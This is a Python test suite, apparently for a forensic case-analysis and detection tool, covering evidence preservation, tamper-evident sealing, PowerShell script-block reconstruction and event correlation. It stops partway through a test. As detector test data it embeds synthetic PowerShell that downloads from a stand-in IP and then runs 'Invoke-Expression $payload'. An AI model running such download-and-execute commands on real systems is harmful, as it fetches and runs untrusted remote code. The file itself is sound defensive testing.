from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import patch

from tracesoc.cli.case import (
    analyze_case,
    verify_case_seal,
)
from tracesoc.evidence.artifacts import (
    Artifact,
    ArtifactImmutabilityState,
    ArtifactProcessingState,
)
from tracesoc.evidence.identity import (
    compute_event_id,
)
from tracesoc.evidence.intake import (
    AdapterFamily,
    EvidenceDirectoryIntake,
    EvidenceFileIntake,
)
from tracesoc.models import (
    CanonicalEvent,
    ClockState,
    RawLocator,
    SourceType,
)


REPO = Path(
    __file__
).resolve().parents[2]

UTC_TIME = datetime(
    2026,
    9,
    22,
    12,
    0,
    0,
    tzinfo=timezone.utc,
)


def correlation_case_event(
    *,
    source_type: SourceType,
    event_type: str,
    record_index: int,
    event_time_utc: datetime,
    host: str,
    principal: str | None,
    semantic_fields: dict[
        str,
        object,
    ],
) -> CanonicalEvent:
    raw = (
        source_type.value
        + "|"
        + event_type
        + "|"
        + str(
            record_index
        )
        + "|"
        + host
    ).encode(
        "utf-8"
    )

    raw_sha256 = (
        __import__(
            "hashlib"
        )
        .sha256(
            raw
        )
        .hexdigest()
    )

    locator = RawLocator(
        logical_source=(
            "synthetic-correlation-case.xml"
        ),
        record_index=(
            record_index
        ),
        line_number=(
            record_index
            + 1
        ),
        byte_offset=0,
        byte_length=len(
            raw
        ),
        raw_sha256=(
            raw_sha256
        ),
        adapter_id=(
            "test-correlation"
        ),
        input_schema_version="1",
    )

    return CanonicalEvent(
        event_id=compute_event_id(
            locator=locator,
            source_type=source_type,
            event_type=event_type,
        ),
        source_type=(
            source_type
        ),
        event_type=(
            event_type
        ),
        clock_state=(
            ClockState.OBSERVED
        ),
        provenance=locator,
        event_time_raw=(
            event_time_utc.isoformat()
        ),
        event_time_utc=(
            event_time_utc
        ),
        host=host,
        principal=principal,
        semantic_fields=(
            semantic_fields
        ),
        source_context={},
    )


def correlation_case_intake(
    *events: CanonicalEvent,
) -> EvidenceDirectoryIntake:
    raw = (
        b"synthetic bounded "
        b"correlation case"
    )

    digest = (
        __import__(
            "hashlib"
        )
        .sha256(
            raw
        )
        .hexdigest()
    )

    artifact = Artifact.create(
        artifact_type=(
            "synthetic_correlation_case"
        ),
        source_path_display=(
            "synthetic-correlation-case.xml"
        ),
        sha256=digest,
        bytes=len(
            raw
        ),
        acquired_or_observed_utc=(
            UTC_TIME
        ),
        immutability_state=(
            ArtifactImmutabilityState.PRESERVED_SOURCE
        ),
        processing_state=(
            ArtifactProcessingState.SUPPORTED_PROCESSED
        ),
    )

    return EvidenceDirectoryIntake(
        root_display_name=(
            "evidence"
        ),
        items=(
            EvidenceFileIntake(
                artifact=artifact,
                adapter_family=(
                    AdapterFamily.POWERSHELL_XML
                ),
                canonical_events=(
                    tuple(
                        events
                    )
                ),
            ),
        ),
    )


class CaseRunnerV04Tests(
    unittest.TestCase
):
    def test_real_mixed_directory_is_accounted_and_sealed(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "message.eml"
            ).write_bytes(
                b"From: a@example.com\r\n"
                b"To: b@example.com\r\n"
                b"Subject: test\r\n"
                b"\r\n"
                b"body\r\n"
            )

            (
                root
                / "unknown.bin"
            ).write_bytes(
                b"unsupported evidence"
            )

            result = (
                analyze_case(
                    evidence_directory=(
                        root
                    ),
                    output_directory=(
                        output
                    ),
                )
            )

            self.assertTrue(
                result[
                    "seal_verified"
                ]
            )

            manifest = json.loads(
                (
                    output
                    / "case-manifest.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            accounting = manifest[
                "artifact_accounting"
            ]

            self.assertEqual(
                accounting[
                    "discovered"
                ],
                2,
            )

            self.assertEqual(
                accounting[
                    "accounted"
                ],
                2,
            )

            self.assertTrue(
                accounting[
                    "zero_silent_loss"
                ]
            )

            self.assertEqual(
                accounting[
                    "unsupported_preserved"
                ],
                1,
            )

            verification = (
                verify_case_seal(
                    output
                )
            )

            self.assertTrue(
                verification[
                    "seal_verified"
                ]
            )

    def test_output_inside_evidence_tree_is_rejected(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            root.mkdir()

            (
                root
                / "unknown.bin"
            ).write_bytes(
                b"x"
            )

            with self.assertRaises(
                RuntimeError
            ):
                analyze_case(
                    evidence_directory=(
                        root
                    ),
                    output_directory=(
                        root
                        / "case"
                    ),
                )

    def test_existing_output_is_never_overwritten(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()
            output.mkdir()

            (
                root
                / "unknown.bin"
            ).write_bytes(
                b"x"
            )

            marker = (
                output
                / "keep.txt"
            )

            marker.write_text(
                "keep",
                encoding="utf-8",
            )

            with self.assertRaises(
                FileExistsError
            ):
                analyze_case(
                    evidence_directory=(
                        root
                    ),
                    output_directory=(
                        output
                    ),
                )

            self.assertEqual(
                marker.read_text(
                    encoding="utf-8"
                ),
                "keep",
            )

    def test_tampered_case_output_fails_seal_verification(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "unknown.bin"
            ).write_bytes(
                b"x"
            )

            analyze_case(
                evidence_directory=root,
                output_directory=output,
            )

            (
                output
                / "artifact-index.json"
            ).write_text(
                "{}\n",
                encoding="utf-8",
            )

            with self.assertRaises(
                RuntimeError
            ):
                verify_case_seal(
                    output
                )

    def test_canonical_event_runs_all_six_event_detectors(
        self,
    ) -> None:
        raw = (
            b"PowerShell event"
        )

        locator = RawLocator(
            logical_source=(
                "events.xml"
            ),
            record_index=0,
            line_number=1,
            byte_offset=0,
            byte_length=len(
                raw
            ),
            raw_sha256=(
                __import__(
                    "hashlib"
                )
                .sha256(
                    raw
                )
                .hexdigest()
            ),
            adapter_id=(
                "test-powershell"
            ),
            input_schema_version="1",
        )

        event = CanonicalEvent(
            event_id=compute_event_id(
                locator=locator,
                source_type=(
                    SourceType.POWERSHELL
                ),
                event_type=(
                    "script_execution"
                ),
            ),
            source_type=(
                SourceType.POWERSHELL
            ),
            event_type=(
                "script_execution"
            ),
            clock_state=(
                ClockState.OBSERVED
            ),
            provenance=locator,
            event_time_raw=(
                "2026-09-22T12:00:00Z"
            ),
            event_time_utc=(
                UTC_TIME
            ),
            host="HOST-1",
            principal=None,
            semantic_fields={
                "engine": (
                    r"C:\Windows\System32\WindowsPowerShell"
                    r"\v1.0\powershell.exe"
                ),
                "script_text": (
                    "Invoke-WebRequest "
                    "https://198.51.100.20/a"
                ),
            },
            source_context={},
        )

        artifact = Artifact.create(
            artifact_type=(
                "windows_event_xml"
            ),
            source_path_display=(
                "events.xml"
            ),
            sha256=locator.raw_sha256,
            bytes=len(
                raw
            ),
            acquired_or_observed_utc=(
                UTC_TIME
            ),
            immutability_state=(
                ArtifactImmutabilityState.PRESERVED_SOURCE
            ),
            processing_state=(
                ArtifactProcessingState.SUPPORTED_PROCESSED
            ),
        )

        intake = EvidenceDirectoryIntake(
            root_display_name=(
                "evidence"
            ),
            items=(
                EvidenceFileIntake(
                    artifact=artifact,
                    adapter_family=(
                        AdapterFamily.POWERSHELL_XML
                    ),
                    canonical_events=(
                        event,
                    ),
                ),
            ),
        )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "events.xml"
            ).write_bytes(
                b"PowerShell event"
            )

            with patch(
                "tracesoc.cli.case."
                "ingest_evidence_directory",
                return_value=intake,
            ):
                result = (
                    analyze_case(
                        evidence_directory=(
                            root
                        ),
                        output_directory=(
                            output
                        ),
                    )
                )

            detections = json.loads(
                (
                    output
                    / "detections.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "detections"
            ]

        self.assertEqual(
            result[
                "detection_evaluation_count"
            ],
            6,
        )

        self.assertEqual(
            {
                item[
                    "detection_id"
                ]
                for item
                in detections
            },
            {
                "TRC-DET-001",
                "TRC-DET-004",
                "TRC-DET-005",
                "TRC-DET-006",
                "TRC-DET-007",
                "TRC-DET-008",
            },
        )

        self.assertTrue(
            any(
                item[
                    "detection_id"
                ]
                == "TRC-DET-001"
                and item[
                    "matched"
                ]
                for item
                in detections
            )
        )


    def test_manifest_accounts_for_all_eight_integrated_detectors(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "unknown.bin"
            ).write_bytes(
                b"x"
            )

            result = analyze_case(
                evidence_directory=root,
                output_directory=output,
            )

            manifest = json.loads(
                (
                    output
                    / "case-manifest.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

        coverage = (
            manifest[
                "detector_coverage"
            ]
        )

        self.assertEqual(
            coverage[
                "evaluated_event_detectors"
            ],
            [
                "TRC-DET-001",
                "TRC-DET-004",
                "TRC-DET-005",
                "TRC-DET-006",
                "TRC-DET-007",
                "TRC-DET-008",
            ],
        )

        self.assertEqual(
            coverage[
                "evaluated_scriptblock_detectors"
            ],
            [
                "TRC-DET-002",
                "TRC-DET-003",
            ],
        )

        self.assertEqual(
            coverage[
                "deferred_scriptblock_detectors"
            ],
            [],
        )

        self.assertIsNone(
            coverage[
                "deferred_reason"
            ]
        )

        self.assertTrue(
            coverage[
                "all_registered_detectors_integrated"
            ]
        )

        self.assertEqual(
            result[
                "deferred_scriptblock_detector_count"
            ],
            0,
        )

        self.assertEqual(
            result[
                "scriptblock_detector_count"
            ],
            2,
        )

        self.assertFalse(
            manifest[
                "analytic_boundary"
            ][
                "incident_declared"
            ]
        )


    def test_cli_case_analyze_works_through_existing_module_entrypoint(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "unknown.bin"
            ).write_bytes(
                b"x"
            )

            env = dict(
                os.environ
            )

            src = str(
                REPO
                / "src"
            )

            env[
                "PYTHONPATH"
            ] = (
                src
                if not env.get(
                    "PYTHONPATH"
                )
                else (
                    src
                    + os.pathsep
                    + env[
                        "PYTHONPATH"
                    ]
                )
            )

            process = subprocess.run(
                [
                    sys.executable,
                    "-m",
                    "tracesoc",
                    "case",
                    "analyze",
                    str(
                        root
                    ),
                    "--output",
                    str(
                        output
                    ),
                ],
                cwd=REPO,
                env=env,
                capture_output=True,
                text=True,
                check=False,
            )

            self.assertEqual(
                process.returncode,
                0,
                msg=(
                    process.stderr
                ),
            )

            self.assertTrue(
                (
                    output
                    / "case-seal.json"
                ).is_file()
            )

            self.assertIn(
                "CASE_ID=",
                process.stdout,
            )

            self.assertIn(
                "SEAL_VERIFIED=TRUE",
                process.stdout,
            )

    def test_real_4104_fragments_reconstruct_and_run_det002_det003(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            first = (
                '<Event '
                'xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                '<System>'
                '<Provider Name="Microsoft-Windows-PowerShell"/>'
                '<EventID>4104</EventID>'
                '<Version>1</Version>'
                '<Level>3</Level>'
                '<Task>2</Task>'
                '<Opcode>15</Opcode>'
                '<Keywords>0x0</Keywords>'
                '<TimeCreated SystemTime="2026-09-22T12:00:00.000001Z"/>'
                '<EventRecordID>1</EventRecordID>'
                '<Correlation ActivityID="{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}"/>'
                '<Execution ProcessID="100" ThreadID="200"/>'
                '<Channel>Microsoft-Windows-PowerShell/Operational</Channel>'
                '<Computer>HOST-01</Computer>'
                '<Security UserID="S-1-5-21-test"/>'
                '</System>'
                '<EventData>'
                '<Data Name="MessageNumber">1</Data>'
                '<Data Name="MessageTotal">2</Data>'
                '<Data Name="ScriptBlockText">'
                'Invoke-WebRequest http://198.51.100.20/a;'
                '</Data>'
                '<Data Name="ScriptBlockId">block-case-1</Data>'
                '<Data Name="Path"></Data>'
                '</EventData>'
                '</Event>'
            )

            second = (
                '<Event '
                'xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                '<System>'
                '<Provider Name="Microsoft-Windows-PowerShell"/>'
                '<EventID>4104</EventID>'
                '<Version>1</Version>'
                '<Level>3</Level>'
                '<Task>2</Task>'
                '<Opcode>15</Opcode>'
                '<Keywords>0x0</Keywords>'
                '<TimeCreated SystemTime="2026-09-22T12:00:00.000002Z"/>'
                '<EventRecordID>2</EventRecordID>'
                '<Correlation ActivityID="{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}"/>'
                '<Execution ProcessID="100" ThreadID="200"/>'
                '<Channel>Microsoft-Windows-PowerShell/Operational</Channel>'
                '<Computer>HOST-01</Computer>'
                '<Security UserID="S-1-5-21-test"/>'
                '</System>'
                '<EventData>'
                '<Data Name="MessageNumber">2</Data>'
                '<Data Name="MessageTotal">2</Data>'
                '<Data Name="ScriptBlockText">'
                ' Invoke-Expression $payload'
                '</Data>'
                '<Data Name="ScriptBlockId">block-case-1</Data>'
                '<Data Name="Path"></Data>'
                '</EventData>'
                '</Event>'
            )

            (
                root
                / "powershell.xml"
            ).write_bytes(
                (
                    first
                    + second
                ).encode(
                    "utf-8"
                )
            )

            result = (
                analyze_case(
                    evidence_directory=root,
                    output_directory=output,
                )
            )

            blocks = json.loads(
                (
                    output
                    / "powershell-scriptblocks.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "scriptblocks"
            ]

            detections = json.loads(
                (
                    output
                    / "detections.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "detections"
            ]

            manifest = json.loads(
                (
                    output
                    / "case-manifest.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            seal = json.loads(
                (
                    output
                    / "case-seal.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

        self.assertEqual(
            result[
                "scriptblock_count"
            ],
            1,
        )

        self.assertEqual(
            result[
                "scriptblock_detection_evaluation_count"
            ],
            2,
        )

        self.assertEqual(
            len(
                blocks
            ),
            1,
        )

        block = blocks[0]

        self.assertEqual(
            block[
                "state"
            ],
            "complete",
        )

        self.assertEqual(
            block[
                "script_block_id"
            ],
            "block-case-1",
        )

        self.assertEqual(
            block[
                "observed_message_numbers"
            ],
            [
                1,
                2,
            ],
        )

        self.assertEqual(
            block[
                "missing_message_numbers"
            ],
            [],
        )

        self.assertEqual(
            len(
                block[
                    "parent_event_ids"
                ]
            ),
            2,
        )

        scriptblock_results = [
            item
            for item
            in detections
            if (
                item[
                    "evaluated_input_kind"
                ]
                == "powershell_script_block"
            )
        ]

        self.assertEqual(
            {
                item[
                    "detection_id"
                ]
                for item
                in scriptblock_results
            },
            {
                "TRC-DET-002",
                "TRC-DET-003",
            },
        )

        det002 = next(
            item
            for item
            in scriptblock_results
            if (
                item[
                    "detection_id"
                ]
                == "TRC-DET-002"
            )
        )

        self.assertTrue(
            det002[
                "matched"
            ]
        )

        self.assertEqual(
            set(
                det002[
                    "contributing_event_ids"
                ]
            ),
            set(
                block[
                    "parent_event_ids"
                ]
            ),
        )

        self.assertEqual(
            manifest[
                "analysis_counts"
            ][
                "powershell_scriptblocks"
            ],
            1,
        )

        self.assertEqual(
            manifest[
                "analysis_counts"
            ][
                "complete_powershell_scriptblocks"
            ],
            1,
        )

        self.assertEqual(
            manifest[
                "analysis_counts"
            ][
                "incomplete_powershell_scriptblocks"
            ],
            0,
        )

        sealed_names = [
            item[
                "path"
            ]
            for item
            in seal[
                "files"
            ]
        ]

        self.assertIn(
            "powershell-scriptblocks.json",
            sealed_names,
        )

        self.assertTrue(
            result[
                "seal_verified"
            ]
        )

    def test_incomplete_4104_group_is_preserved_and_not_asserted_complete(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            record = (
                '<Event '
                'xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                '<System>'
                '<Provider Name="Microsoft-Windows-PowerShell"/>'
                '<EventID>4104</EventID>'
                '<Version>1</Version>'
                '<Level>3</Level>'
                '<Task>2</Task>'
                '<Opcode>15</Opcode>'
                '<Keywords>0x0</Keywords>'
                '<TimeCreated SystemTime="2026-09-22T12:00:00.000001Z"/>'
                '<EventRecordID>1</EventRecordID>'
                '<Correlation ActivityID="{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}"/>'
                '<Execution ProcessID="100" ThreadID="200"/>'
                '<Channel>Microsoft-Windows-PowerShell/Operational</Channel>'
                '<Computer>HOST-01</Computer>'
                '<Security UserID="S-1-5-21-test"/>'
                '</System>'
                '<EventData>'
                '<Data Name="MessageNumber">1</Data>'
                '<Data Name="MessageTotal">2</Data>'
                '<Data Name="ScriptBlockText">'
                'Invoke-WebRequest http://198.51.100.20/a'
                '</Data>'
                '<Data Name="ScriptBlockId">block-incomplete</Data>'
                '<Data Name="Path"></Data>'
                '</EventData>'
                '</Event>'
            )

            (
                root
                / "powershell.xml"
            ).write_bytes(
                record.encode(
                    "utf-8"
                )
            )

            analyze_case(
                evidence_directory=root,
                output_directory=output,
            )

            blocks = json.loads(
                (
                    output
                    / "powershell-scriptblocks.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "scriptblocks"
            ]

            detections = json.loads(
                (
                    output
                    / "detections.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "detections"
            ]

        self.assertEqual(
            len(
                blocks
            ),
            1,
        )

        self.assertEqual(
            blocks[0][
                "state"
            ],
            "incomplete",
        )

        self.assertIsNone(
            blocks[0][
                "script_text"
            ]
        )

        self.assertIsNone(
            blocks[0][
                "script_text_sha256"
            ]
        )

        self.assertEqual(
            blocks[0][
                "missing_message_numbers"
            ],
            [
                2,
            ],
        )

        scriptblock_results = [
            item
            for item
            in detections
            if (
                item[
                    "evaluated_input_kind"
                ]
                == "powershell_script_block"
            )
        ]

        self.assertEqual(
            len(
                scriptblock_results
            ),
            2,
        )

        self.assertTrue(
            all(
                not item[
                    "matched"
                ]
                for item
                in scriptblock_results
            )
        )

        self.assertTrue(
            all(
                item[
                    "reason_code"
                ]
                == "incomplete_script_block"
                for item
                in scriptblock_results
            )
        )

    def test_case_runner_emits_two_bounded_correlations_and_relationships(
        self,
    ) -> None:
        sysmon = (
            correlation_case_event(
                source_type=(
                    SourceType.SYSMON
                ),
                event_type=(
                    "process_create"
                ),
                record_index=0,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    11,
                    59,
                    50,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "process_name": (
                        r"C:\Windows\System32\WindowsPowerShell"
                        r"\v1.0\powershell.exe"
                    ),
                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        powershell = (
            correlation_case_event(
                source_type=(
                    SourceType.POWERSHELL
                ),
                event_type=(
                    "script_execution"
                ),
                record_index=1,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "engine":
                        "powershell.exe",

                    "script_text": (
                        "Invoke-WebRequest "
                        "http://198.51.100.20:8080/a"
                    ),

                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        zeek = (
            correlation_case_event(
                source_type=(
                    SourceType.ZEEK
                ),
                event_type=(
                    "network_connection"
                ),
                record_index=2,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    10,
                    tzinfo=timezone.utc,
                ),
                host="HOST-1",
                principal=None,
                semantic_fields={
                    "src_ip":
                        "10.0.0.5",

                    "dst_ip":
                        "198.51.100.20",

                    "dst_port":
                        8080,
                },
            )
        )

        intake = (
            correlation_case_intake(
                sysmon,
                powershell,
                zeek,
            )
        )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "synthetic-correlation-case.xml"
            ).write_bytes(
                b"synthetic bounded correlation case"
            )

            with patch(
                "tracesoc.cli.case."
                "ingest_evidence_directory",
                return_value=intake,
            ):
                result = (
                    analyze_case(
                        evidence_directory=root,
                        output_directory=output,
                    )
                )

            correlations = json.loads(
                (
                    output
                    / "correlations.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "correlations"
            ]

            graph = json.loads(
                (
                    output
                    / "relationships.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            hypotheses = json.loads(
                (
                    output
                    / "hypotheses.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "hypotheses"
            ]

            manifest = json.loads(
                (
                    output
                    / "case-manifest.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            self.assertTrue(
                verify_case_seal(
                    output
                )[
                    "seal_verified"
                ]
            )

        self.assertEqual(
            result[
                "correlation_evaluation_count"
            ],
            2,
        )

        self.assertEqual(
            result[
                "matched_correlation_count"
            ],
            2,
        )

        self.assertEqual(
            result[
                "relationship_count"
            ],
            2,
        )

        self.assertEqual(
            result[
                "hypothesis_count"
            ],
            2,
        )

        self.assertEqual(
            len(
                hypotheses
            ),
            2,
        )

        self.assertTrue(
            all(
                item[
                    "evidence_state"
                ]
                == "CORROBORATED"
                for item
                in hypotheses
            )
        )

        self.assertTrue(
            all(
                len(
                    item[
                        "detection_result_ids"
                    ]
                )
                == 1
                for item
                in hypotheses
            )
        )

        self.assertTrue(
            all(
                len(
                    item[
                        "supporting_relationship_ids"
                    ]
                )
                == 1
                for item
                in hypotheses
            )
        )

        self.assertTrue(
            all(
                len(
                    item[
                        "observation_ids"
                    ]
                )
                == 2
                for item
                in hypotheses
            )
        )

        self.assertEqual(
            {
                item[
                    "correlation_id"
                ]
                for item
                in correlations
            },
            {
                "TRC-CORR-001",
                "TRC-CORR-002",
            },
        )

        self.assertTrue(
            all(
                item[
                    "matched"
                ]
                for item
                in correlations
            )
        )

        relationships = (
            graph[
                "relationships"
            ]
        )

        self.assertEqual(
            len(
                relationships
            ),
            2,
        )

        self.assertEqual(
            {
                item[
                    "legacy_correlation_id"
                ]
                for item
                in relationships
            },
            {
                "TRC-CORR-001",
                "TRC-CORR-002",
            },
        )

        self.assertTrue(
            all(
                item[
                    "relationship_type"
                ]
                == "CORROBORATES"
                for item
                in relationships
            )
        )

        for relationship in relationships:
            anchors = (
                relationship[
                    "anchors"
                ]
            )

            self.assertTrue(
                any(
                    not anchor[
                        "temporal"
                    ]
                    for anchor
                    in anchors
                )
            )

        self.assertEqual(
            manifest[
                "analysis_counts"
            ][
                "matched_correlations"
            ],
            2,
        )

        self.assertEqual(
            manifest[
                "analysis_counts"
            ][
                "graph_relationships"
            ],
            2,
        )

        self.assertEqual(
            manifest[
                "analysis_counts"
            ][
                "hypotheses"
            ],
            2,
        )

        self.assertTrue(
            manifest[
                "analytic_boundary"
            ][
                "generic_hypotheses_created"
            ]
        )

        self.assertFalse(
            manifest[
                "hypothesis_boundary"
            ][
                "incident_membership_implied"
            ]
        )

        self.assertFalse(
            manifest[
                "correlation_coverage"
            ][
                "timestamp_only_relationship_allowed"
            ]
        )

        self.assertFalse(
            manifest[
                "analytic_boundary"
            ][
                "incident_declared"
            ]
        )



    def test_timestamp_proximity_without_anchor_creates_no_relationship(
        self,
    ) -> None:
        powershell = (
            correlation_case_event(
                source_type=(
                    SourceType.POWERSHELL
                ),
                event_type=(
                    "script_execution"
                ),
                record_index=10,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-A",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "engine":
                        "powershell.exe",

                    "script_text": (
                        "Invoke-WebRequest "
                        "http://198.51.100.20:8080/a"
                    ),

                    "local_ip":
                        "10.0.0.5",
                },
            )
        )

        zeek = (
            correlation_case_event(
                source_type=(
                    SourceType.ZEEK
                ),
                event_type=(
                    "network_connection"
                ),
                record_index=11,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-B",
                principal=None,
                semantic_fields={
                    "src_ip":
                        "10.0.0.5",

                    "dst_ip":
                        "198.51.100.20",

                    "dst_port":
                        8080,
                },
            )
        )

        intake = (
            correlation_case_intake(
                powershell,
                zeek,
            )
        )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "synthetic-correlation-case.xml"
            ).write_bytes(
                b"synthetic bounded correlation case"
            )

            with patch(
                "tracesoc.cli.case."
                "ingest_evidence_directory",
                return_value=intake,
            ):
                result = (
                    analyze_case(
                        evidence_directory=root,
                        output_directory=output,
                    )
                )

            correlations = json.loads(
                (
                    output
                    / "correlations.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "correlations"
            ]

            relationships = json.loads(
                (
                    output
                    / "relationships.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "relationships"
            ]

            hypotheses = json.loads(
                (
                    output
                    / "hypotheses.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "hypotheses"
            ]

        self.assertEqual(
            len(
                correlations
            ),
            1,
        )

        self.assertFalse(
            correlations[0][
                "matched"
            ]
        )

        self.assertEqual(
            relationships,
            [],
        )

        self.assertEqual(
            hypotheses,
            [],
        )

        self.assertEqual(
            result[
                "matched_correlation_count"
            ],
            0,
        )

        self.assertEqual(
            result[
                "relationship_count"
            ],
            0,
        )

        self.assertEqual(
            result[
                "hypothesis_count"
            ],
            0,
        )



    def test_raw_evidence_is_embedded_byte_exact_and_sealed(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            nested = (
                root
                / "nested"
            )

            nested.mkdir(
                parents=True
            )

            first_bytes = (
                b"\x00\x01raw-binary-evidence\xff"
            )

            second_bytes = (
                b"From: a@example.com\r\n"
                b"To: b@example.com\r\n"
                b"Subject: preserved\r\n"
                b"\r\n"
                b"body\r\n"
            )

            (
                nested
                / "sample.bin"
            ).write_bytes(
                first_bytes
            )

            (
                root
                / "message.eml"
            ).write_bytes(
                second_bytes
            )

            result = analyze_case(
                evidence_directory=root,
                output_directory=output,
            )

            raw_index = json.loads(
                (
                    output
                    / "raw-evidence-index.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            seal = json.loads(
                (
                    output
                    / "case-seal.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            verification = (
                verify_case_seal(
                    output
                )
            )

            preserved_first = (
                output
                / "raw-evidence"
                / "nested"
                / "sample.bin"
            ).read_bytes()

            preserved_second = (
                output
                / "raw-evidence"
                / "message.eml"
            ).read_bytes()

            source_first_after = (
                nested
                / "sample.bin"
            ).read_bytes()

            source_second_after = (
                root
                / "message.eml"
            ).read_bytes()

        self.assertEqual(
            preserved_first,
            first_bytes,
        )

        self.assertEqual(
            preserved_second,
            second_bytes,
        )

        self.assertEqual(
            source_first_after,
            first_bytes,
        )

        self.assertEqual(
            source_second_after,
            second_bytes,
        )

        records = (
            raw_index[
                "raw_evidence_files"
            ]
        )

        self.assertEqual(
            {
                item[
                    "source_path_display"
                ]
                for item
                in records
            },
            {
                "message.eml",
                "nested/sample.bin",
            },
        )

        self.assertEqual(
            {
                item[
                    "case_relative_path"
                ]
                for item
                in records
            },
            {
                "raw-evidence/message.eml",
                "raw-evidence/nested/sample.bin",
            },
        )

        self.assertTrue(
            seal[
                "raw_evidence_embedded"
            ]
        )

        self.assertEqual(
            seal[
                "raw_evidence_file_count"
            ],
            2,
        )

        self.assertEqual(
            seal[
                "raw_evidence_copy_status"
            ],
            "VERIFIED_BYTE_EXACT_V0.4.5E",
        )

        self.assertEqual(
            verification[
                "raw_evidence_hashes_verified"
            ],
            2,
        )

        self.assertTrue(
            verification[
                "seal_verified"
            ]
        )

        self.assertTrue(
            result[
                "raw_evidence_embedded"
            ]
        )

        self.assertEqual(
            result[
                "raw_evidence_file_count"
            ],
            2,
        )

        sealed_names = {
            item[
                "path"
            ]
            for item
            in seal[
                "files"
            ]
        }

        self.assertIn(
            "raw-evidence/message.eml",
            sealed_names,
        )

        self.assertIn(
            "raw-evidence/nested/sample.bin",
            sealed_names,
        )


    def test_tampered_embedded_raw_evidence_fails_case_seal(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            original = (
                b"immutable evidence bytes"
            )

            (
                root
                / "unknown.bin"
            ).write_bytes(
                original
            )

            analyze_case(
                evidence_directory=root,
                output_directory=output,
            )

            preserved = (
                output
                / "raw-evidence"
                / "unknown.bin"
            )

            preserved.write_bytes(
                b"tampered evidence bytes"
            )

            with self.assertRaises(
                RuntimeError
            ):
                verify_case_seal(
                    output
                )


    def test_tampered_raw_index_fails_before_path_can_escape(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
